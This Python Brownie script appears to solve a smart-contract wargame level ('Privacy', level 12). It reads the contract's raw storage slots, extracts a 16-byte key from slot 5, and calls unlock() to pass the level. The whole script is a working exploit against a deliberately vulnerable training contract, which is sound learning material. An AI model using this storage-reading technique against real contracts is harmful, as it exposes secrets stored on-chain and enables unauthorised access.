from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
    get_web3,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=12, player=player)
    w3 = get_web3()

    privacy_contract = interface.IPrivacy(instance_address)

    for slot_id in range(8):
        print(f'slot {slot_id}')
        print(Web3.toInt(w3.eth.get_storage_at(instance_address, slot_id)))
        print()
    
    print("Examining data[2]...")
    data_2 = w3.eth.get_storage_at(instance_address, 5)
    print(data_2)
    print(data_2[:16])
    print(data_2[16:])
    print()
    
    tx = privacy_contract.unlock(data_2[:16], {"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
